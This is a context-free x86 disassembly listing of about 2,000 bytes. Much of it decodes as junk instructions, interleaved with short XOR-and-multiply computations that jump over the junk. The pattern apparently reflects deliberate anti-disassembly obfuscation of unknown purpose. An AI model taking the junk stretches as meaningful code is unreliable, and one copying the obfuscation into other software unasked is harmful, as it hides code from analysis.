  404243:	stos   DWORD PTR es:[edi],eax
  404244:	icebp  
  404245:	sti    
  404246:	mov    esi,0x14480c6
  40424b:	inc    eax
  40424c:	xor    edx,eax
  40424e:	xor    edi,eax
  404250:	jmp    0x4043fa
  404255:	xchg   ebp,eax
  404256:	push   0xffffffb8
  404258:	int3   
  404259:	jns    0x404237
  40425b:	imul   eax,DWORD PTR gs:[ebp+eax*4+0x27],0x15
  404261:	popf   
  404262:	inc    edi
  404263:	pusha  
  404264:	(bad)  
  404265:	in     eax,dx
  404266:	push   ss
  404267:	jle    0x4042e7
  404269:	mov    edi,DWORD PTR [edi+0x7e]
  40426c:	jle    0x4042b8
  40426e:	gs jnp 0x404265
  404271:	clc    
  404272:	push   ebp
  404273:	fstp   TBYTE PTR [edx-0x1a]
  404276:	fisubr DWORD PTR [edx+0x5c]
  404279:	xchg   bl,bh
  40427b:	add    esi,esp
  40427d:	fs jecxz 0x404244
  404280:	and    esp,esp
  404282:	shl    DWORD PTR [ebp-0x69],0xc6
  404286:	int3   
  404287:	fstp   QWORD PTR [ebx+ecx*2+0x2e]
  40428b:	pop    ss
  40428c:	lock cmp ah,BYTE PTR [edx-0x1b43df10]
  404293:	icebp  
  404294:	xor    al,0xc7
  404296:	push   0xe10dd7cd
  40429b:	cmp    al,dl
  40429d:	jne    0x404227
  40429f:	push   ebx
  4042a0:	xlat   BYTE PTR ds:[ebx]
  4042a1:	les    eax,FWORD PTR [ecx-0x5644b648]
  4042a7:	rcr    esi,0x46
  4042aa:	xchg   esi,esp
  4042ac:	sbb    eax,0x56d2f9ec
  4042b1:	lea    edx,[ecx-0x68]
  4042b4:	add    eax,0x4aa73d17
  4042b9:	dec    edx
  4042ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042bb:	push   ss
  4042bc:	and    DWORD PTR [ebp-0x5c],ecx
  4042bf:	pushf  
  4042c0:	mov    ah,0x63
  4042c2:	(bad)  
  4042c4:	sahf   
  4042c5:	js     0x404284
  4042c7:	jmp    0x4051:0xd303709e
  4042ce:	push   ss
  4042cf:	adc    ch,BYTE PTR [esi-0xf]
  4042d2:	int    0x5b
  4042d4:	out    0x5d,eax
  4042d6:	aad    0x93
  4042d8:	pop    ebx
  4042d9:	push   cs
  4042da:	aaa    
  4042db:	rcr    BYTE PTR [esi-0x45],0x2c
  4042df:	and    al,0xb6
  4042e1:	cli    
  4042e2:	xchg   BYTE PTR [eax-0x6b],ch
  4042e5:	lods   al,BYTE PTR ds:[esi]
  4042e6:	(bad)  
  4042e7:	test   eax,0x2c6bfb84
  4042ec:	jmp    0x4953:0x8790f16a
  4042f3:	jmp    0xcde6:0xd4cd3a38
  4042fa:	xchg   ecx,eax
  4042fb:	mov    ah,0xb5
  4042fd:	add    eax,0x62425b55
  404302:	popa   
  404303:	sbb    al,0x33
  404305:	and    bh,dh
  404307:	mov    ch,0xfd
  404309:	das    
  40430a:	stc    
  40430b:	and    eax,0x67307ad1
  404310:	fiadd  DWORD PTR [ecx]
  404312:	repz cmp dh,ah
  404315:	pushf  
  404316:	mov    ds:0xefc387e6,al
  40431b:	mov    ebx,0xe3b3c2b9
  404320:	gs aam 0xa9
  404323:	and    al,0xff
  404325:	ja     0x40437f
  404327:	xchg   DWORD PTR [edx+0x20458986],esi
  40432d:	inc    ebp
  40432e:	scas   eax,DWORD PTR es:[edi]
  40432f:	and    eax,0x14ea2956
  404334:	mov    ah,dl
  404336:	fisttp DWORD PTR [ecx+eax*4+0x10]
  40433a:	or     dh,BYTE PTR [edi-0x65]
  40433d:	clc    
  40433e:	add    DWORD PTR [ecx-0x7fb04002],esp
  404344:	test   DWORD PTR [edx],0xfef7b135
  40434a:	or     DWORD PTR ds:0x62f805bf,edi
  404350:	xchg   ebx,eax
  404351:	add    al,0x7a
  404353:	je     0x40430c
  404355:	mov    ds:0xf2c453f8,eax
  40435a:	jg     0x40433d
  40435c:	scas   al,BYTE PTR es:[edi]
  40435d:	mov    edi,0x9de84092
  404362:	pop    edi
  404363:	shr    BYTE PTR [edi-0x1f03056],1
  404369:	cmp    esp,DWORD PTR [edx+0x65]
  40436c:	out    0x59,al
  40436e:	fisub  DWORD PTR [ebx+0x2f057bd5]
  404374:	push   0xd0264ac4
  404379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40437a:	mov    esp,0x335e2c12
  40437f:	and    esp,ebx
  404381:	xor    esp,DWORD PTR [edx]
  404383:	jp     0x404312
  404385:	leave  
  404386:	sbb    BYTE PTR [ebx+0x4b],0x31
  40438a:	pop    ebx
  40438b:	add    eax,0xe7c55f33
  404390:	sub    ecx,DWORD PTR ds:0xbf1d79b
  404396:	in     al,0x98
  404398:	jecxz  0x4043c5
  40439a:	stos   BYTE PTR es:[edi],al
  40439b:	xchg   edx,eax
  40439c:	jbe    0x404408
  40439e:	and    eax,0x2242a96
  4043a3:	aaa    
  4043a4:	rol    cl,0x68
  4043a7:	mov    cl,0x7a
  4043a9:	cmp    BYTE PTR [ebx-0x55],bh
  4043ac:	xchg   esp,eax
  4043ad:	sbb    al,0x2e
  4043af:	inc    edi
  4043b0:	xor    esi,DWORD PTR [eax+0x785c9aa5]
  4043b6:	(bad)  
  4043b7:	sti    
  4043b8:	mov    DWORD PTR [ecx+esi*2+0x17fef76c],0x2b82ef2
  4043c3:	(bad)  
  4043c4:	(bad)  
  4043c5:	stc    
  4043c6:	xchg   esi,eax
  4043c7:	cmp    dh,ah
  4043c9:	or     edi,DWORD PTR [ecx+0x52]
  4043cc:	aaa    
  4043cd:	lds    edi,FWORD PTR [eax+edi*4+0x26]
  4043d1:	lods   eax,DWORD PTR ds:[esi]
  4043d2:	mov    ah,0xc2
  4043d4:	dec    esi
  4043d5:	jb     0x4043e5
  4043d7:	push   eax
  4043d8:	dec    esi
  4043d9:	cmp    BYTE PTR [ebx-0x1],ah
  4043dc:	pop    ebx
  4043dd:	mov    gs,WORD PTR ds:[edx]
  4043e0:	push   esi
  4043e1:	ins    DWORD PTR es:[edi],dx
  4043e2:	xchg   ecx,eax
  4043e3:	lea    ebx,[esi-0x49]
  4043e6:	ins    BYTE PTR es:[edi],dx
  4043e7:	inc    eax
  4043e8:	aaa    
  4043e9:	push   0x8e75b9b6
  4043ee:	repnz cwde 
  4043f0:	pop    ss
  4043f1:	rcl    BYTE PTR [ebx-0x3f905c75],cl
  4043f7:	jnp    0x404417
  4043f9:	cmc    
  4043fa:	add    edi,ecx
  4043fc:	add    edx,ecx
  4043fe:	imul   edx,edi
  404401:	mov    edi,DWORD PTR [ebp-0x8]
  404404:	mov    ebx,DWORD PTR [ebp-0x10]
  404407:	sub    ebx,edi
  404409:	cmp    ebx,edx
  40440b:	ja     0x404419
  404411:	mov    edx,DWORD PTR [ebp-0x30]
  404414:	jmp    0x404613
  404419:	mov    edx,DWORD PTR [ebp-0x38]
  40441c:	mov    edi,DWORD PTR [ebp-0x4]
  40441f:	xor    edx,eax
  404421:	xor    edi,eax
  404423:	add    edi,ecx
  404425:	add    edx,ecx
  404427:	imul   edx,edi
  40442a:	mov    edi,DWORD PTR [ebp-0x8]
  40442d:	mov    ebx,DWORD PTR [ebp-0x10]
  404430:	sub    ebx,edi
  404432:	cmp    ebx,edx
  404434:	ja     0x4045ec
  40443a:	jmp    0x4045e4
  40443f:	hlt    
  404440:	mov    ah,0xbf
  404442:	add    bh,BYTE PTR [edi+0x42444505]
  404448:	pop    ecx
  404449:	mov    ds:0x80d907df,al
  40444e:	adc    DWORD PTR [edx+0x17],edi
  404451:	jle    0x4044d1
  404453:	mov    edi,DWORD PTR [edi+0x7e]
  404456:	jle    0x4043e1
  404458:	pushf  
  404459:	push   DWORD PTR [eax]
  40445b:	sti    
  40445c:	push   ebx
  40445d:	in     al,0xac
  40445f:	dec    esp
  404460:	nop
  404461:	out    dx,al
  404462:	ret    
  404463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404464:	ret    
  404465:	scas   eax,DWORD PTR es:[edi]
  404466:	clc    
  404467:	popf   
  404468:	(bad)  
  404469:	push   ebp
  40446a:	push   esp
  40446b:	mov    edx,0xb3993d8
  404470:	mov    es,eax
  404472:	outs   dx,DWORD PTR ds:[esi]
  404473:	fwait
  404474:	retf   
  404475:	sub    BYTE PTR [ecx],ch
  404477:	scas   eax,DWORD PTR es:[edi]
  404478:	xchg   ebx,eax
  404479:	mov    esi,DWORD PTR [esi]
  40447b:	call   0x4c4a:0x5710e2c2
  404482:	cwde   
  404483:	popf   
  404484:	pop    ebp
  404485:	mov    esp,0x7ae32a31
  40448a:	xor    al,0xa4
  40448c:	ffree  st(3)
  40448e:	cs mov edi,edx
  404491:	mov    DWORD PTR [esi-0x45f26842],ebx
  404497:	dec    ecx
  404498:	push   ebx
  404499:	xchg   edx,eax
  40449a:	sbb    DWORD PTR es:[ebp+0x7922f939],esp
  4044a1:	sbb    bl,ch
  4044a3:	fadd   st(7),st
  4044a5:	mov    ds:0xf6bb991d,eax
  4044aa:	std    
  4044ab:	mov    bh,0x49
  4044ad:	cmp    DWORD PTR [ebp+eax*2+0x3e21ec11],edx
  4044b4:	mov    cl,0xcb
  4044b6:	aam    0x85
  4044b8:	jmp    0x404500
  4044ba:	(bad)  
  4044bb:	shr    BYTE PTR [ebx*4-0x89a6490],cl
  4044c2:	rcr    dl,1
  4044c4:	or     BYTE PTR [ecx+esi*4],ch
  4044c7:	(bad)  
  4044c8:	mov    esi,0x5d2001bd
  4044cd:	test   eax,0xfe0d7c2f
  4044d2:	lods   eax,DWORD PTR ds:[esi]
  4044d3:	ror    BYTE PTR [esi],cl
  4044d5:	ret    0xfe3
  4044d8:	adc    al,0x55
  4044da:	ret    
  4044db:	jo     0x4044bf
  4044dd:	add    eax,0xabdcb3fd
  4044e2:	repz xor BYTE PTR [edi+0x5d],bl
  4044e6:	icebp  
  4044e7:	aam    0x4c
  4044e9:	mov    ah,0x39
  4044eb:	xor    al,bh
  4044ed:	cld    
  4044ee:	rcr    BYTE PTR [ebp*2-0x3bc8d724],0xc2
  4044f6:	sbb    DWORD PTR ds:0xa7a260f4,0x61
  4044fd:	add    al,0x85
  4044ff:	pop    ebx
  404500:	add    al,0xd1
  404502:	in     al,0x45
  404504:	enter  0xec85,0x83
  404508:	pusha  
  404509:	ja     0x40454a
  40450b:	cmp    eax,DWORD PTR [esi+0x4d3e4f88]
  404511:	dec    bx
  404513:	inc    esi
  404514:	and    DWORD PTR [edi-0x6c],esi
  404517:	pushf  
  404518:	dec    ebx
  404519:	mov    bh,0x85
  40451b:	jle    0x404514
  40451d:	fisubr WORD PTR [ebx+0x5ff00f3]
  404523:	(bad)  
  404524:	lods   al,BYTE PTR ds:[esi]
  404525:	cwde   
  404526:	dec    edi
  404527:	jb     0x4044ec
  404529:	cmp    edi,DWORD PTR [ecx+ebp*4]
  40452c:	scas   al,BYTE PTR es:[edi]
  40452d:	and    eax,DWORD PTR [esi]
  40452f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404530:	inc    ebx
  404531:	pop    eax
  404532:	movzx  ecx,WORD PTR [eax+0x56bf62d2]
  404539:	pop    ds
  40453a:	and    eax,0xeaa8047d
  40453f:	dec    ebp
  404540:	sbb    BYTE PTR [ebx],bl
  404542:	repnz dec esi
  404544:	cdq    
  404545:	dec    edx
  404546:	ret    
  404547:	std    
  404548:	cmp    ebp,ebp
  40454a:	xchg   edi,eax
  40454b:	adc    al,0x86
  40454d:	mov    al,ds:0x7a64422c
  404552:	test   al,0x2d
  404554:	loope  0x4045d0
  404556:	stos   BYTE PTR es:[edi],al
  404557:	(bad)  
  404558:	pop    ds
  404559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40455a:	inc    ecx
  40455b:	fstp   QWORD PTR [eax-0x126bf31a]
  404561:	ja     0x4045c3
  404563:	fcomp  DWORD PTR [esi-0x2009326e]
  40456a:	dec    esi
  40456b:	out    0x1f,al
  40456d:	mov    esp,esp
  40456f:	or     DWORD PTR [edx+esi*8],ebp
  404572:	add    ecx,0x7a
  404575:	out    0x4e,eax
  404577:	(bad)  
  404578:	mov    DWORD PTR [edx-0x7ef2ddc8],ecx
  40457e:	loope  0x404542
  404580:	test   BYTE PTR [eax],bl
  404582:	sahf   
  404583:	fs (bad) 
  404585:	gs jmp 0xa31dcc87
  40458b:	jbe    0x404602
  40458d:	fsubr  DWORD PTR ss:[ecx]
  404590:	mov    BYTE PTR [ebx-0x72596c88],bh
  404596:	jne    0x40458f
  404598:	ins    BYTE PTR es:[edi],dx
  404599:	sub    edi,eax
  40459b:	pop    ebp
  40459c:	loopne 0x404606
  40459e:	outs   dx,BYTE PTR ds:[esi]
  40459f:	and    DWORD PTR [edi+0x1ee4ee01],esp
  4045a5:	add    eax,0x345fee9
  4045aa:	call   0xb792:0x383cdec1
  4045b1:	jmp    0x5581b730
  4045b6:	imul   eax,DWORD PTR [ebp-0x758fa34e],0x11
  4045bd:	mov    dh,0xc5
  4045bf:	(bad)  
  4045c0:	jne    0x404563
  4045c2:	pop    edi
  4045c3:	add    DWORD PTR [ebp+0x33],ebx
  4045c6:	push   ss
  4045c7:	mov    DWORD PTR [edi],ebp
  4045c9:	fnstenv [ebp+ebp*1-0x3838c73c]
  4045d0:	scas   al,BYTE PTR es:[edi]
  4045d1:	loop   0x404608
  4045d3:	jb     0x4045aa
  4045d5:	in     al,dx
  4045d6:	jmp    0x4ce65625
  4045db:	outs   dx,BYTE PTR ds:[esi]
  4045dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045dd:	(bad)  
  4045de:	mov    al,BYTE PTR [ebx]
  4045e0:	mov    eax,0x8b14eef1
  4045e5:	push   ebp
  4045e6:	int3   
  4045e7:	jmp    0x404613
  4045ec:	mov    edx,DWORD PTR [ebp-0x3c]
  4045ef:	mov    edi,DWORD PTR [ebp-0x4]
  4045f2:	xor    edx,eax
  4045f4:	xor    edi,eax
  4045f6:	add    edx,ecx
  4045f8:	add    edi,ecx
  4045fa:	imul   edx,edi
  4045fd:	mov    edi,DWORD PTR [ebp-0x8]
  404600:	mov    ebx,DWORD PTR [ebp-0x10]
  404603:	sub    ebx,edi
  404605:	cmp    ebx,edx
  404607:	mov    edx,DWORD PTR [ebp-0x38]
  40460a:	jbe    0x404613
  404610:	mov    edx,DWORD PTR [ebp-0x3c]
  404613:	mov    edi,DWORD PTR [ebp-0x4]
  404616:	xor    edi,eax
  404618:	xor    edx,eax
  40461a:	add    edi,ecx
  40461c:	add    edx,ecx
  40461e:	imul   edx,edi
  404621:	mov    DWORD PTR [ebp+0xc],edx
  404624:	mov    edx,DWORD PTR [ebp+0xc]
  404627:	mov    DWORD PTR [ebp-0x24],edx
  40462a:	mov    edx,DWORD PTR [ebp-0x8]
  40462d:	add    edx,DWORD PTR [ebp-0x40]
  404630:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  404637:	mov    DWORD PTR [ebp-0x1c],edx
  40463a:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404641:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404648:	mov    edx,DWORD PTR [ebp-0x18]
  40464b:	xor    edx,eax
  40464d:	add    edx,ecx
  40464f:	jmp    0x404d64
  404654:	mov    edx,DWORD PTR [ebp-0x18]
  404657:	jmp    0x404801
  40465c:	dec    esi
  40465d:	(bad)  
  40465e:	(bad)  
  40465f:	push   edi
  404660:	dec    esi
  404661:	push   edi
  404662:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404664:	xor    BYTE PTR [edx-0x30a140d0],al
  40466a:	pop    edi
  40466b:	pop    edi
  40466c:	imul   DWORD PTR [ecx]
  40466e:	jle    0x4046ee
  404670:	mov    edi,DWORD PTR [edi+0x7e]
  404673:	jle    0x4045f8
  404675:	(bad)  
  404676:	mov    al,0xd9
  404678:	cmp    dh,ah
  40467a:	sub    BYTE PTR [ebx+0x7f],ah
  40467d:	xchg   ecx,eax
  40467e:	xor    eax,0x94792dfd
  404683:	es jb  0x4046a2
  404686:	sub    ebp,DWORD PTR [ebp+0x3955db4c]
  40468c:	xlat   BYTE PTR ds:[ebx]
  40468d:	add    esi,esp
  40468f:	cmp    eax,0x27920483
  404694:	and    BYTE PTR [ebx],dl
  404696:	retf   
  404697:	push   edx
  404698:	je     0x4046f5
  40469a:	popa   
  40469b:	xchg   BYTE PTR [eax],dh
  40469d:	dec    ebp
  40469e:	mov    eax,0x57947da7
  4046a3:	mov    ecx,0x9f68de2f
  4046a8:	pop    esp
  4046a9:	and    eax,0xada91fb2
  4046ae:	add    al,0xde
  4046b0:	mul    DWORD PTR [edi+0x53]
  4046b3:	popf   
  4046b4:	adc    DWORD PTR [esi],ebx
  4046b6:	daa    
  4046b7:	push   0xec27ba00
  4046bc:	shl    dh,0x68
  4046bf:	bound  esi,QWORD PTR [edi]
  4046c1:	xor    ch,bl
  4046c3:	add    dl,BYTE PTR [eax]
  4046c5:	push   esp
  4046c6:	jnp    0x4046ac
  4046c8:	add    al,0x49
  4046ca:	and    DWORD PTR [ecx],ebp
  4046cc:	inc    ebx
  4046cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046ce:	cmp    DWORD PTR [esi+0x6bbb8c22],edx
  4046d4:	push   es
  4046d5:	lods   eax,DWORD PTR ds:[esi]
  4046d6:	add    al,0x40
  4046d8:	lods   al,BYTE PTR ds:[esi]
  4046d9:	int3   
  4046da:	into   
  4046db:	inc    ebp
  4046dc:	push   edi
  4046dd:	xchg   edx,eax
  4046de:	int3   
  4046df:	ins    BYTE PTR es:[edi],dx
  4046e0:	test   dl,0x23
  4046e3:	mov    bl,0x9d
  4046e5:	xchg   esi,eax
  4046e6:	fldz   
  4046e8:	dec    ecx
  4046e9:	inc    edx
  4046ea:	sti    
  4046eb:	lods   al,BYTE PTR ds:[esi]
  4046ec:	fisttp DWORD PTR [edi+0x41]
  4046ef:	adc    ch,0x39
  4046f2:	mov    dl,BYTE PTR [ebp-0x7b]
  4046f5:	xchg   edi,eax
  4046f6:	add    ah,dl
  4046f8:	add    BYTE PTR [edx+0x57],0x4b
  4046fc:	pop    ebp
  4046fd:	out    dx,eax
  4046fe:	add    al,0x26
  404700:	add    dh,al
  404702:	test   eax,0xde37370c
  404707:	outs   dx,BYTE PTR ds:[esi]
  404708:	adc    cl,cl
  40470a:	icebp  
  40470b:	(bad)  
  40470c:	xor    BYTE PTR [ecx+edx*4-0x6a],dl
  404710:	cli    
  404711:	mul    DWORD PTR [eax]
  404713:	data16 int 0x7e
  404716:	in     al,0x41
  404718:	xlat   BYTE PTR ds:[ebx]
  404719:	mov    edi,0x1fb9bf1e
  40471e:	jl     0x40472b
  404720:	add    dl,BYTE PTR [eax+0x45]
  404723:	dec    edx
  404724:	outs   dx,BYTE PTR ds:[esi]
  404725:	shl    BYTE PTR [esi+0x6b50914e],0x7f
  40472c:	xchg   BYTE PTR cs:[edx+0x17],bl
  404730:	cmp    eax,0xc4a27673
  404735:	push   ecx
  404736:	push   cs
  404737:	xor    DWORD PTR [eax-0x31],eax
  40473a:	push   esp
  40473b:	add    BYTE PTR [edx+ecx*4+0x1f],dh
  40473f:	pushf  
  404740:	(bad)  
  404741:	mov    ecx,0xd7f708c7
  404746:	sbb    DWORD PTR [edi+0x4d],esp
  404749:	xor    ah,BYTE PTR [ebx]
  40474b:	fs aaa 
  40474d:	ds jmp 0x4047ad
  404750:	out    0x4c,al
  404752:	mov    eax,ds:0x9183489d
  404757:	(bad)  
  404758:	enter  0x2a6b,0x44
  40475c:	and    ebp,esi
  40475e:	das    
  40475f:	retf   0x3595
  404762:	jg     0x404775
  404764:	jecxz  0x404773
  404766:	std    
  404767:	js     0x40477d
  404769:	arpl   bp,ax
  40476b:	aad    0x4a
  40476d:	scas   al,BYTE PTR es:[edi]
  40476e:	aas    
  40476f:	cli    
  404770:	lods   al,BYTE PTR ds:[esi]
  404771:	cs fwait
  404773:	and    cl,BYTE PTR [ebp+eax*1-0x64]
  404777:	inc    eax
  404778:	or     DWORD PTR [ebx-0x1766cbd2],0xdf4ca2c1
  404782:	pop    edi
  404783:	cwde   
  404784:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404785:	repnz (bad) [edi]
  404788:	pop    edi
  404789:	jl     0x404793
  40478b:	shl    DWORD PTR [ebx-0x1b1883ed],0x9
  404792:	xor    esp,ebp
  404794:	ret    
  404795:	scas   al,BYTE PTR es:[edi]
  404796:	fsubr  DWORD PTR [edx-0x4b]
  404799:	inc    edx
  40479a:	sbb    al,0xf2
  40479c:	call   0x4825f025
  4047a1:	out    0x7c,al
  4047a3:	lock add edi,DWORD PTR [edi+0x30bd492c]
  4047aa:	add    esp,DWORD PTR [ebx+0x3f]
  4047ad:	mov    eax,ds:0xad8b1bc0
  4047b2:	cli    
  4047b3:	leave  
  4047b4:	je     0x40474c
  4047b6:	rcl    DWORD PTR [edi+0x9a7c860],1
  4047bc:	sti    
  4047bd:	cmp    BYTE PTR [edi-0x7],dh
  4047c0:	cdq    
  4047c1:	sbb    ebp,DWORD PTR [ebx+0x47]
  4047c4:	test   BYTE PTR [esi+esi*8-0x5c2a42f0],ah
  4047cb:	xchg   esi,eax
  4047cc:	loop   0x404759
  4047ce:	sub    dl,BYTE PTR [ebx+0x5c]
  4047d1:	(bad)  
  4047d2:	retf   
  4047d3:	pop    edx
  4047d4:	scas   eax,DWORD PTR es:[edi]
  4047d5:	sub    eax,0xd12e517c
  4047da:	adc    edx,DWORD PTR ds:[ecx]
  4047dd:	test   BYTE PTR [si],al
  4047e0:	sbb    al,0x46
  4047e2:	push   0x4aed6cbd
  4047e7:	popa   
  4047e8:	fdivr  QWORD PTR [edx+ebx*2-0x40725ce5]
  4047ef:	jno    0x40486e
  4047f1:	pop    esi
  4047f2:	aaa    
  4047f3:	sbb    ebx,edi
  4047f5:	dec    ecx
  4047f6:	jne    0x4047da
  4047f8:	and    ebx,esi
  4047fa:	inc    ebp
  4047fb:	lahf   
  4047fc:	aam    0xad
  4047fe:	xor    dh,BYTE PTR [eax]
  404800:	push   ebp
  404801:	xor    edx,eax
  404803:	add    edx,DWORD PTR [ebp-0x14]
  404806:	mov    edi,DWORD PTR [ebp-0x1c]
  404809:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404810:	mov    BYTE PTR [ebp+0xf],dl
  404813:	mov    edx,DWORD PTR [ebp-0xc]
  404816:	jmp    0x4049c0
  40481b:	and    BYTE PTR [esi+0x5a2a321e],0x62
  404822:	add    WORD PTR [edx-0x7f00f46],0xfff2
  40482a:	jne    0x404830
  40482c:	sub    edi,DWORD PTR [esi+0x7e]
  40482f:	mov    edi,DWORD PTR [edi+0x7e]
  404832:	jle    0x404865
  404834:	lods   al,BYTE PTR ds:[esi]
  404835:	outs   dx,DWORD PTR ds:[esi]
  404836:	iret   
  404837:	add    BYTE PTR [edi],dl
  404839:	sub    bl,BYTE PTR [esi+ecx*4+0x5e]
  40483d:	and    al,0x81
  40483f:	and    DWORD PTR [esi-0x10],edi
  404842:	pop    eax
  404843:	xlat   BYTE PTR ds:[ebx]
  404844:	xchg   esp,eax
  404845:	jbe    0x404897
  404847:	lods   al,BYTE PTR ds:[esi]
  404848:	test   eax,0x69e1cf0f
  40484d:	dec    ebp
  40484e:	or     bl,al
  404850:	mov    ecx,0x10d94b0b
  404855:	xlat   BYTE PTR ds:[ebx]
  404856:	cwde   
  404857:	or     BYTE PTR [edx-0x2ff2b8],cl
  40485d:	cwde   
  40485e:	das    
  40485f:	adc    al,0x1d
  404861:	adc    ah,ch
  404863:	out    dx,al
  404864:	jne    0x4048ce
  404866:	loope  0x4048dd
  404868:	or     eax,0xefe4879
  40486d:	hlt    
  40486e:	push   esp
  40486f:	mov    dh,0x43
  404871:	dec    edi
  404872:	scas   eax,DWORD PTR es:[edi]
  404873:	xor    BYTE PTR [ebp-0x6f],bh
  404876:	lock push ebx
  404878:	inc    edi
  404879:	dec    edi
  40487a:	fld    QWORD PTR [ebp+0x1c]
  40487d:	ret    
  40487e:	mov    eax,ds:0xa20aa81e
  404883:	iret   
  404884:	fucom  st(1)
  404886:	xor    BYTE PTR [ecx],dl
  404888:	(bad)
  40488b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40488c:	fwait
  40488d:	in     eax,0xf0
  40488f:	and    ch,bl
  404891:	mov    dh,0xc7
  404893:	mov    ds:0xc60a5a69,eax
  404898:	cmp    BYTE PTR [ecx],0x55
  40489b:	push   eax
  40489c:	mov    esp,0x39a6248e
  4048a1:	fwait
  4048a2:	or     BYTE PTR [eax+0x75],bl
  4048a5:	int3   
  4048a6:	sub    BYTE PTR [ebx+0x1c54036e],bh
  4048ac:	shl    BYTE PTR [ebx],0xd4
  4048af:	jnp    0x4048b5
  4048b1:	sub    eax,0x3c6a7bbe
  4048b6:	cdq    
  4048b7:	jp     0x4048d1
  4048b9:	push   ebp
  4048ba:	dec    eax
  4048bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048bc:	mov    al,ds:0x9668e1e
  4048c1:	adc    eax,0xf1c81d79
  4048c6:	mov    ds:0x8d485fcf,al
  4048cb:	push   cs
  4048cc:	imul   edi,ebx,0x2e
  4048cf:	or     al,0x88
  4048d1:	adc    eax,0x4d7ebead
  4048d6:	inc    ebp
  4048d7:	loopne 0x404950
  4048d9:	pop    ecx
  4048da:	xchg   edi,eax
  4048db:	(bad)  
  4048dc:	fiadd  DWORD PTR [eax-0x587a99b9]
  4048e2:	lods   al,BYTE PTR ds:[esi]
  4048e3:	xchg   ebx,eax
  4048e4:	ret    
  4048e5:	pop    ss
  4048e6:	cmp    BYTE PTR [eax+0x694e2806],dh
  4048ec:	fs shl ah,cl
  4048ef:	lds    edi,FWORD PTR [edx+0x4435423d]
  4048f5:	pop    es
  4048f6:	push   ss
  4048f7:	outs   dx,DWORD PTR ds:[esi]
  4048f8:	pop    esp
  4048f9:	or     eax,esi
  4048fb:	not    DWORD PTR [ebx+0x77bfd6b9]
  404901:	xor    edx,ecx
  404903:	pop    ebx
  404904:	jnp    0x4048bd
  404906:	push   ebx
  404907:	ja     0x404911
  404909:	rcr    esi,1
  40490b:	scas   eax,DWORD PTR es:[edi]
  40490c:	mov    BYTE PTR [ecx+0x6e],dh
  40490f:	mov    BYTE PTR [ecx-0x1a559e19],bh
  404915:	xlat   BYTE PTR ds:[ebx]
  404916:	stc    
  404917:	ss mov ecx,0x55ba7db7
  40491d:	dec    edx
  40491e:	lahf   
  40491f:	outs   dx,DWORD PTR ds:[esi]
  404920:	imul   edx,ecx,0x2e
  404923:	push   edx
  404924:	and    eax,0x3e0c86d5
  404929:	and    al,0x87
  40492b:	scas   eax,DWORD PTR es:[edi]
  40492c:	imul   BYTE PTR [ebp-0x63]
  40492f:	cmp    al,0x91
  404931:	pop    ebp
  404932:	cmp    al,0xca
  404934:	mov    bl,0xae
  404936:	daa    
  404937:	xchg   esp,eax
  404938:	or     al,0x70
  40493a:	sub    al,BYTE PTR [ebx+0x35]
  40493d:	jmp    0x8a000fd8
  404942:	mov    cs,esi
  404944:	loop   0x404935
  404946:	sbb    DWORD PTR [esi+0x79],ecx
  404949:	push   es
  40494a:	mov    DWORD PTR [edi-0x72872001],edx
  404950:	xor    edx,0x68
  404953:	and    ch,BYTE PTR [ebx+0x64d748d8]
  404959:	ins    DWORD PTR es:[edi],dx
  40495a:	or     esi,DWORD PTR [esi+0x3c]
  40495d:	loopne 0x4049c3
  40495f:	push   edx
  404960:	(bad)  [ecx+0x9839549]
  404966:	in     eax,dx
  404967:	mov    esi,0xd2f4a814
  40496c:	mov    al,ds:0x5ab728b5
  404971:	mov    ecx,0x6c2b4380
  404976:	stos   BYTE PTR es:[edi],al
  404977:	push   ecx
  404978:	jae    0x404974
  40497a:	test   dh,dl
  40497c:	fldl2t 
  40497e:	cmp    dh,BYTE PTR [esi+0x571a2d8f]
  404984:	fcomip st,st(2)
  404986:	jnp    0x4049f4
  404988:	mov    al,ds:0x8e4a7ceb
  40498d:	jne    0x4049cb
  40498f:	mov    eax,0xa99c030d
  404994:	cld    
  404995:	jmp    0x577a:0x253b921f
  40499c:	mov    dh,0x79
  40499e:	aam    0x1f
  4049a0:	adc    BYTE PTR [esi+0x4f755b35],ah
  4049a6:	js     0x4049e0
  4049a8:	adc    ebp,ecx
  4049aa:	xchg   edx,eax
  4049ab:	cli    
  4049ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049ad:	cmp    DWORD PTR [eax],ecx
  4049af:	mov    edx,0xaf7150d1
  4049b4:	loope  0x404975
  4049b6:	shl    DWORD PTR [ecx+0x40b7c7d],0xb2
  4049bd:	inc    edi
  4049be:	add    eax,0x3d0330f
  4049c3:	push   ebp
  4049c4:	in     al,dx
  4049c5:	jmp    0x404b6f
  4049ca:	test   BYTE PTR [ebp-0x13],cl
  4049cd:	xor    edi,ebp
  4049cf:	push   ebx
  4049d0:	mov    esp,0xd1280b5d
  4049d5:	xor    DWORD PTR [edi-0x6e552ec7],esi
  4049db:	sub    al,0x7e
  4049dd:	jle    0x40496a
  4049df:	jg     0x404a5f
  4049e1:	jle    0x404a3e
  4049e3:	test   al,0xce
  4049e5:	add    BYTE PTR [ecx+0x17],cl
  4049e8:	sar    DWORD PTR [esi+0x36],1
  4049eb:	jmp    0xac29:0x1e0eb54f
  4049f2:	fdivr  st,st(2)
  4049f4:	inc    ebp
  4049f5:	add    eax,0x786035c5
  4049fa:	addr16 jge 0x4049df
  4049fd:	or     esi,DWORD PTR [esi+0x3b]
  404a00:	test   BYTE PTR [eax],0xf8
  404a03:	iret   
  404a04:	scas   al,BYTE PTR es:[edi]
